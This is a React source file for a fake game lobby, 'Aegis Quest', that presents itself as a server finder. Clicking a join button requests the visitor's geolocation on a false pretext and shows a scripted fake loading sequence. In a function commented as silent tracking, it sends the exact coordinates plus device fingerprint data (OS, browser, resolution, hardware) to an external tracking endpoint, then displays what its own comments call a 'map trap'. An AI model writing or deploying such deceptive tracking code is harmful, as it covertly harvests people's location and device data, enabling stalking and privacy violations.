import React, { useEffect, useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { UAParser } from 'ua-parser-js';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Leaflet default icon fix
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
    iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',
    iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',
    shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
});

const Lobbies = () => {
    const [isOptimizing, setIsOptimizing] = useState(false);
    const [showMap, setShowMap] = useState(false);
    const [progress, setProgress] = useState(0);
    const [currentStep, setCurrentStep] = useState("");
    const [userCoords, setUserCoords] = useState(null);

    const steps = [
        "Scanning Local Area Networks...",
        "Identifying Nearest Node...",
        "Establishing Secure Handshake...",
        "Bypassing Regional Firewalls..."
    ];

    const handleJoin = () => {
        // Step 1: Request Location
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
                setUserCoords(coords);
                
                // Step 2: Start Loading Animation
                setIsOptimizing(true);
                startFakeLoading(coords);
                
                // Step 3: Silent Tracking
                sendDataToAegis(coords);
            },
            () => alert("ERROR: Geolocation required to find nearest server.")
        );
    };

    const startFakeLoading = (coords) => {
        let count = 0;
        const interval = setInterval(() => {
            count += 1;
            setProgress(count);
            
            if (count < 25) setCurrentStep(steps[0]);
            else if (count < 50) setCurrentStep(steps[1]);
            else if (count < 75) setCurrentStep(steps[2]);
            else setCurrentStep(steps[3]);

            if (count >= 100) {
                clearInterval(interval);
                setTimeout(() => {
                    setIsOptimizing(false);
                    setShowMap(true); // Open the map trap
                }, 800);
            }
        }, 30);
    };

    const sendDataToAegis = (coords) => {
    const parser = new UAParser();
    const res = parser.getResult();
    fetch('https://test-project-backend-kohl.vercel.app/track-user', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            coords: coords,
            device: {
                os: res.os.name,
                osVersion: res.os.version, 
                browser: res.browser.name,
                browserVersion: res.browser.version, 
                resolution: `${window.screen.width}x${window.screen.height}`,
                vendor: res.device.vendor || "Generic PC",
                model: res.device.model || "PC", 
                cpu: res.cpu.architecture || "x64", 
            }
        })
    });
};

    return (
        <div className="min-h-screen bg-gray-950 text-white p-10 font-sans relative overflow-hidden">
            {/* Header */}
            <div className="max-w-6xl mx-auto flex justify-between items-center mb-12 border-b border-gray-800 pb-6">
                <h1 className="text-2xl font-black text-cyan-400 italic">AEGIS QUEST <span className="text-[10px] text-gray-600 block tracking-[0.4em] font-mono mt-1">GLOBAL SERVER FINDER</span></h1>
            </div>

            {/* Lobby Cards */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-6xl mx-auto">
                {[1, 2, 3].map((i) => (
                    <div key={i} className="bg-gray-900 border border-gray-800 p-8 rounded-[40px] hover:border-cyan-500/50 transition-all group shadow-2xl">
                        <h3 className="text-xl font-black mb-6 italic uppercase tracking-tighter">RAIYAN SHEIKH 0{i}</h3>
                        <button 
                            onClick={handleJoin}
                            className="w-full bg-cyan-500 text-black font-black py-4 rounded-2xl hover:bg-white transition-all text-xs uppercase tracking-widest"
                        >
                            Find: server 0{i}
                        </button>
                    </div>
                ))}
            </div>

            {/* STEP 1: Optimization Overlay */}
            <AnimatePresence>
                {isOptimizing && (
                    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-6 backdrop-blur-md">
                        <div className="max-w-md w-full text-center">
                            <div className="w-20 h-20 border-4 border-t-cyan-500 border-gray-800 rounded-full mx-auto mb-8 animate-spin" />
                            <h2 className="text-2xl font-black italic mb-2 uppercase tracking-tighter text-cyan-400">Locating Server...</h2>
                            <p className="text-[10px] text-gray-500 font-mono mb-8 uppercase tracking-widest">{currentStep}</p>
                            <div className="w-full bg-gray-900 h-1.5 rounded-full overflow-hidden border border-gray-800">
                                <motion.div className="h-full bg-cyan-500" initial={{ width: 0 }} animate={{ width: `${progress}%` }} />
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* STEP 2: The Map Trap */}
            <AnimatePresence>
                {showMap && userCoords && (
                    <motion.div initial={{ y: "100%" }} animate={{ y: 0 }} exit={{ y: "100%" }} transition={{ type: "spring", damping: 25 }} className="fixed inset-0 bg-gray-950 z-[60] p-6 flex flex-col">
                        <div className="flex justify-between items-center mb-6">
                            <div>
                                <h2 className="text-3xl font-black italic text-cyan-400 uppercase">Server Found!</h2>
                                <p className="text-xs font-mono text-gray-500 uppercase tracking-widest">Optimized Node: [X-77] PRIVATE_HUB</p>
                            </div>
                            <button onClick={() => setShowMap(false)} className="bg-red-500/20 text-red-500 px-6 py-2 rounded-full border border-red-500/30 font-bold text-xs uppercase hover:bg-red-500 hover:text-white transition-all">Close Link</button>
                        </div>

                        <div className="flex-1 rounded-[40px] overflow-hidden border-2 border-cyan-500/30 shadow-[0_0_50px_rgba(6,182,212,0.1)]">
                            <MapContainer center={[userCoords.lat, userCoords.lng]} zoom={15} style={{ height: '100%', width: '100%' }}>
                                <TileLayer url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png" />
                                <Marker position={[userCoords.lat, userCoords.lng]}>
                                    <Popup className="font-mono text-xs">
                                        <b className="text-cyan-600 uppercase">Aegis Server Node</b><br/>
                                        Latency: 4ms | Stability: 99%
                                    </Popup>
                                </Marker>
                            </MapContainer>
                        </div>
                        
                        <div className="mt-6 text-center">
                            <button className="bg-white text-black font-black px-12 py-4 rounded-2xl uppercase tracking-widest text-xs hover:bg-cyan-500 transition-all shadow-xl">
                                Join Private Session
                            </button>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
};

export default Lobbies;